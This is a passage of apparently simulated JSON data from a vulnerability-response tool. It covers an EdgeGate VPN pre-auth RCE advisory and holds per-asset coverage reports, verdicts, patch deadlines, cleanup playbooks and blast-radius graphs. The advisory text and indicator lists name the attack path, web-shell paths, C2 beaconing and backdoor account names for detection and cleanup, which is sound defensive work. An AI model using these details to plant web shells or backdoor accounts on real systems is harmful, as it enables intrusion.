          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        }
      ],
      "adequate": true,
      "blind_spots": [
        "WEB: Only 42 of 45 days available",
        "NETWORK: Only 44 of 45 days available",
        "FILE: Only 43 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-HARBOR-005",
      "advisory_id": "SIM-2026-0001",
      "state": "No evidence found",
      "confidence": "high",
      "reasons": [
        {
          "text": "No indicators of compromise or anomalous exploit behaviors detected across 97% telemetry coverage over the past 45 days.",
          "evidence_ids": [
            "COV-VERIFIED-harbor-api-server-01"
          ]
        }
      ],
      "coverage_score": 0.973,
      "coverage_report": {
        "asset_id": "ASSET-HARBOR-005",
        "overall_coverage": 0.973,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 42,
            "coverage_ratio": 0.933,
            "gaps": [
              "Missing 3 days of historical telemetry (42/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          }
        ],
        "adequate": true,
        "blind_spots": [
          "WEB: Only 42 of 45 days available",
          "NETWORK: Only 44 of 45 days available",
          "FILE: Only 43 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.094237+00:00",
      "verdict_hash": "c098e8b999e4df037fe353387c08cd5e70dc1624d8064c66c5c8ddb38a5e83e1"
    },
    "gate": {
      "asset_id": "ASSET-HARBOR-005",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch now",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.094241+00:00"
    },
    "clock": {
      "asset_id": "ASSET-HARBOR-005",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "high (24h)",
      "start_time": "2026-10-18T17:48:03.113303+00:00",
      "deadline_time": "2026-10-19T17:48:03.113303+00:00",
      "seconds_remaining": 86400,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-HARBOR-005-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-HARBOR-005",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate harbor-api-server-01 (192.0.2.22) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-HARBOR-005",
      "root_node_id": "harbor-api-server-01",
      "nodes": [
        {
          "id": "harbor-api-server-01",
          "label": "harbor-api-server-01 (Focal Gateway)",
          "type": "host",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "harbor-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "harbor-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "harbor-api-server-01",
          "target": "harbor-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "harbor-api-server-01",
          "target": "harbor-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "harbor-cred-vault",
          "target": "harbor-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "harbor-jump-host-01",
          "target": "harbor-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "harbor-dc-ad-01",
          "target": "harbor-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  },
  "ASSET-HARBOR-016": {
    "asset": {
      "id": "ASSET-HARBOR-016",
      "host_name": "harbor-unkn-asset-02",
      "tenant_id": "harbor-logistics",
      "owner": "admin@harborlogistics.in",
      "product": "EdgeGate VPN",
      "version": "Unknown",
      "internet_facing": false,
      "criticality": "medium",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.64",
      "exposure_tier": "high",
      "status": "needs_inventory",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-HARBOR-016",
      "overall_coverage": 0.973,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        }
      ],
      "adequate": true,
      "blind_spots": [
        "WEB: Only 43 of 45 days available",
        "ENDPOINT: Only 43 of 45 days available",
        "AUTH: Only 43 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-HARBOR-016",
      "advisory_id": "SIM-2026-0001",
      "state": "No evidence found",
      "confidence": "high",
      "reasons": [
        {
          "text": "No indicators of compromise or anomalous exploit behaviors detected across 97% telemetry coverage over the past 45 days.",
          "evidence_ids": [
            "COV-VERIFIED-harbor-unkn-asset-02"
          ]
        }
      ],
      "coverage_score": 0.973,
      "coverage_report": {
        "asset_id": "ASSET-HARBOR-016",
        "overall_coverage": 0.973,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          }
        ],
        "adequate": true,
        "blind_spots": [
          "WEB: Only 43 of 45 days available",
          "ENDPOINT: Only 43 of 45 days available",
          "AUTH: Only 43 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.098551+00:00",
      "verdict_hash": "73a099f59fbcd83d785f563718eaa1679a3c4aa7d8cf33e153c2af49fe87a387"
    },
    "gate": {
      "asset_id": "ASSET-HARBOR-016",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch now",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.098554+00:00"
    },
    "clock": {
      "asset_id": "ASSET-HARBOR-016",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "high (24h)",
      "start_time": "2026-10-18T17:48:03.113323+00:00",
      "deadline_time": "2026-10-19T17:48:03.113323+00:00",
      "seconds_remaining": 86400,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-HARBOR-016-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-HARBOR-016",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate harbor-unkn-asset-02 (192.0.2.64) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-HARBOR-016",
      "root_node_id": "harbor-unkn-asset-02",
      "nodes": [
        {
          "id": "harbor-unkn-asset-02",
          "label": "harbor-unkn-asset-02 (Focal Gateway)",
          "type": "host",
          "criticality": "medium",
          "compromised": false
        },
        {
          "id": "harbor-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "harbor-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "harbor-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "harbor-unkn-asset-02",
          "target": "harbor-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "harbor-unkn-asset-02",
          "target": "harbor-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "harbor-cred-vault",
          "target": "harbor-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "harbor-jump-host-01",
          "target": "harbor-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "harbor-dc-ad-01",
          "target": "harbor-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  },
  "ASSET-LOTUS-002": {
    "asset": {
      "id": "ASSET-LOTUS-002",
      "host_name": "lotus-vpn-gw-02",
      "tenant_id": "lotus-clinics",
      "owner": "admin@lotusclinics.in",
      "product": "EdgeGate VPN",
      "version": "9.2.1",
      "internet_facing": true,
      "criticality": "high",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.136",
      "exposure_tier": "high",
      "status": "matched",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-LOTUS-002",
      "overall_coverage": 0.964,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 42,
          "coverage_ratio": 0.933,
          "gaps": [
            "Missing 3 days of historical telemetry (42/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 42,
          "coverage_ratio": 0.933,
          "gaps": [
            "Missing 3 days of historical telemetry (42/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        }
      ],
      "adequate": true,
      "blind_spots": [
        "WEB: Only 42 of 45 days available",
        "AUTH: Only 44 of 45 days available",
        "NETWORK: Only 42 of 45 days available",
        "FILE: Only 44 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-LOTUS-002",
      "advisory_id": "SIM-2026-0001",
      "state": "No evidence found",
      "confidence": "high",
      "reasons": [
        {
          "text": "No indicators of compromise or anomalous exploit behaviors detected across 96% telemetry coverage over the past 45 days.",
          "evidence_ids": [
            "COV-VERIFIED-lotus-vpn-gw-02"
          ]
        }
      ],
      "coverage_score": 0.964,
      "coverage_report": {
        "asset_id": "ASSET-LOTUS-002",
        "overall_coverage": 0.964,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 42,
            "coverage_ratio": 0.933,
            "gaps": [
              "Missing 3 days of historical telemetry (42/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 42,
            "coverage_ratio": 0.933,
            "gaps": [
              "Missing 3 days of historical telemetry (42/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          }
        ],
        "adequate": true,
        "blind_spots": [
          "WEB: Only 42 of 45 days available",
          "AUTH: Only 44 of 45 days available",
          "NETWORK: Only 42 of 45 days available",
          "FILE: Only 44 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.103209+00:00",
      "verdict_hash": "a205bd08840516757b94f03a00a986fa29a53c783826b1c3c9756c6296baabc1"
    },
    "gate": {
      "asset_id": "ASSET-LOTUS-002",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch now",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.103213+00:00"
    },
    "clock": {
      "asset_id": "ASSET-LOTUS-002",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "high (24h)",
      "start_time": "2026-10-18T17:48:03.113343+00:00",
      "deadline_time": "2026-10-19T17:48:03.113343+00:00",
      "seconds_remaining": 86400,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-LOTUS-002-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-LOTUS-002",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate lotus-vpn-gw-02 (192.0.2.136) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
